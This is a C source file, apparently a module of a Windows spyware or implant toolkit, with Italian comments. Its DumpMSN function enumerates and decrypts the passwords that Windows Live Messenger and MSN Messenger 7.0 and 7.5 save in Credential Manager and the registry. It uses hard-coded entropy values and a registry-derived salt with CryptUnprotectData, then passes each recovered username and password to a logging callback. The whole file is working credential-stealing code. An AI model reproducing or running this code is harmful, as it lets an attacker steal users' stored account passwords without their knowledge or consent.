#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include "..\common.h"
#import "pstorec.dll" no_namespace
#include <WinCred.h>

// callback for the password
extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);

typedef BOOL (WINAPI *typeCredEnumerate)(WCHAR *, DWORD, DWORD *, PCREDENTIALW **);
typedef VOID (WINAPI *typeCredFree)(PVOID);
typedef BOOL (WINAPI *typeCryptUnprotectData)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, PVOID, DWORD, DATA_BLOB *);


int DumpMSN(void)
{
	BYTE Entropy[]={0xE0,0x00,0xC8,0x00,0x08,0x01,0x10,0x01,0xC0,0x00,0x14,0x01,0xD8,0x00,0xDC,0x00, 
                    0xB4,0x00,0xE4,0x00,0x18,0x01,0x14,0x01,0x04,0x01,0xB4,0x00,0xD0,0x00,0xDC,0x00,  
                    0xD0,0x00,0xE0,0x00,0xB4,0x00,0xE0,0x00,0xD8,0x00,0xDC,0x00,0xC8,0x00,0xB4,0x00,  
                    0x10,0x01,0xD4,0x00,0x14,0x01,0x18,0x01,0x14,0x01,0xD4,0x00,0x08,0x01,0xDC,0x00,  
					0xDC,0x00,0xE4,0x00,0x08,0x01,0xC0,0x00,0x00,0x00};                    

	BYTE Entropy2[]={0x25,0x00,0x47,0x00,0x4B,0x00,0x50,0x00,0x24,0x00,0x5E,0x00,0x25,0x00,0x5E,0x00,
                     0x26,0x00,0x4C,0x00,0x4C,0x00,0x28,0x00,0x25,0x00,0x5E,0x00,0x24,0x00,0x5E,0x00,		             
					 0x4F,0x00,0x26,0x00,0x54,0x00,0x52,0x00,0x24,0x00,0x5E,0x00,0x25,0x00,0x5E,0x00,
					 0x47,0x00,0x56,0x00,0x36,0x00,0x3B,0x00,0x6C,0x00,0x78,0x00,0x7A,0x00,0x64,0x00};

	typeCredEnumerate pfCredEnumerate = NULL;
	typeCredFree pfCredFree = NULL;
	typeCryptUnprotectData pfCryptUnprotectData = NULL;
	PCREDENTIALW *CredentialCollection = NULL;
    HMODULE hAdvapi32DLL = NULL;
	HMODULE hCrypt32DLL = NULL;
    DWORD dwCount = 0;    
	DWORD dwTempIndex = 0;
    
	if ( (hAdvapi32DLL = LoadLibrary("advapi32.dll")) ) {
		pfCredEnumerate = (typeCredEnumerate)GetProcAddress(hAdvapi32DLL, "CredEnumerateW");
		pfCredFree = (typeCredFree)GetProcAddress(hAdvapi32DLL, "CredFree");
	}

	if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  {
		pfCryptUnprotectData = (typeCryptUnprotectData)GetProcAddress(hCrypt32DLL, "CryptUnprotectData");
	}

	// MSN live 2008 & 2009
	if ( pfCredEnumerate && pfCredFree ) { 
		dwCount = 0;  
		CredentialCollection = NULL;
		pfCredEnumerate(L"WindowsLive:name=*", 0, &dwCount, &CredentialCollection);
		for(dwTempIndex=0; dwTempIndex<dwCount; dwTempIndex++) {
			WCHAR password[300];
			DWORD size = CredentialCollection[dwTempIndex]->CredentialBlobSize;
			
			memset(password, 0, sizeof(password));

			if (size < sizeof(password)-sizeof(WCHAR) )
				memcpy(password, CredentialCollection[dwTempIndex]->CredentialBlob, size);
			
			LogPassword(L"Windows Live Messenger", L"Live Messenger 2008/2009", CredentialCollection[dwTempIndex]->UserName, password);
		}
		if (CredentialCollection) 
			pfCredFree(CredentialCollection);
	}

	// Windows Messenger / MSN Messenger 7.0
	if ( pfCredEnumerate && pfCredFree && pfCryptUnprotectData) { 
		DATA_BLOB entropy_blob, in_blob, out_blob;

		dwCount = 0;    
		CredentialCollection = NULL;
		pfCredEnumerate(L"Passport.Net\\*", 0, &dwCount, &CredentialCollection);
		entropy_blob.cbData = 0x4A;
		entropy_blob.pbData = Entropy;
		for(dwTempIndex=0; dwTempIndex<dwCount; dwTempIndex++) {
			WCHAR pass[256];
			in_blob.cbData = CredentialCollection[dwTempIndex]->CredentialBlobSize;
			in_blob.pbData = CredentialCollection[dwTempIndex]->CredentialBlob;
			if (!in_blob.pbData)
				continue;
			if (!pfCryptUnprotectData(&in_blob, 0, &entropy_blob, 0, 0, 1, &out_blob))
				continue;

			memset(pass, 0, sizeof(pass));
			memcpy(pass, out_blob.pbData, (out_blob.cbData < 256) ? out_blob.cbData : 254 );
			LogPassword(L"Windows Messenger", L"MSN Messenger 7.0", CredentialCollection[dwTempIndex]->UserName, pass);
			LocalFree(out_blob.pbData);		
		}
		if (CredentialCollection) 
			pfCredFree(CredentialCollection);
	}

	// MSN 7.5
	if (pfCryptUnprotectData) { 
		HKEY hreg, hkey_creds, hkey_pass;
		BYTE salt_buf[512];
		DWORD type;
		DATA_BLOB entropy_blob, in_blob, out_blob, pass_blob;
		DWORD salt_len = sizeof(salt_buf);
		if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, (LPCTSTR )"Software\\Microsoft\\IdentityCRL\\Dynamic Salt", 0, KEY_READ, &hreg ) == ERROR_SUCCESS) {
			if (FNC(RegQueryValueExA)(hreg, "Value", NULL, &type, salt_buf, &salt_len) == ERROR_SUCCESS) {
				entropy_blob.cbData = 0x40;
				entropy_blob.pbData = Entropy2;

				in_blob.cbData = salt_len;
				in_blob.pbData = salt_buf;

				if (pfCryptUnprotectData(&in_blob, NULL, &entropy_blob, 0, 0, 1, &out_blob)) {
					entropy_blob.cbData = out_blob.cbData + 0x40;
					entropy_blob.pbData = (BYTE *)malloc(entropy_blob.cbData);
					if (entropy_blob.pbData) {
						memcpy(entropy_blob.pbData, Entropy2, 0x40);
						memcpy(entropy_blob.pbData+0x40, out_blob.pbData, out_blob.cbData);

						// Qui abbiamo l'entropy corretta per decifrare le password
						if (FNC(RegOpenKeyExW)(HKEY_CURRENT_USER, L"Software\\Microsoft\\IdentityCRL\\Creds", 0, KEY_READ, &hkey_creds) == ERROR_SUCCESS) {
							for (DWORD i=0;; i++) {
								FILETIME ft;
								LONG ret_val;
								WCHAR key_name[512];
								DWORD key_size = sizeof(key_name)/sizeof(WCHAR);
								ret_val = FNC(RegEnumKeyExW)(hkey_creds, i, key_name, &key_size, NULL, NULL, NULL, &ft);
								if (ret_val == ERROR_NO_MORE_ITEMS)
									break;
								if (ret_val == ERROR_SUCCESS) {
									WCHAR tmp_buffer[512];
									DWORD key_len = sizeof(tmp_buffer);
									_snwprintf_s(tmp_buffer, sizeof(tmp_buffer)/sizeof(WCHAR), _TRUNCATE, L"Software\\Microsoft\\IdentityCRL\\Creds\\%s", key_name);		
									// Qui apriamo le chiavi dei singoli utenti
									if (FNC(RegOpenKeyExW)(HKEY_CURRENT_USER, tmp_buffer, 0, KEY_READ, &hkey_pass) == ERROR_SUCCESS) {
										if (FNC(RegQueryValueExW)(hkey_pass, L"ps:password", NULL, &type, (BYTE *)tmp_buffer, &key_len) == ERROR_SUCCESS) {
											in_blob.cbData = key_len;
											in_blob.pbData = (BYTE *)tmp_buffer;
											if (pfCryptUnprotectData(&in_blob, NULL, &entropy_blob, 0, 0, 1, &pass_blob)) {
												WCHAR pass[256];

												memset(pass, 0, sizeof(pass));
												memcpy(pass, pass_blob.pbData, (pass_blob.cbData < 256) ? pass_blob.cbData : 254 );
												
												LogPassword(L"Windows Messenger", L"MSN Messenger 7.5", key_name, pass);
												LocalFree(pass_blob.pbData);
											}
										}
										FNC(RegCloseKey)(hkey_pass);
									}
								}
							}
							FNC(RegCloseKey)(hkey_creds);
						}
						free(entropy_blob.pbData);
					}
					LocalFree(out_blob.pbData);
				}
			}
			FNC(RegCloseKey)(hreg);
		}
	}
	
	return 0;
}

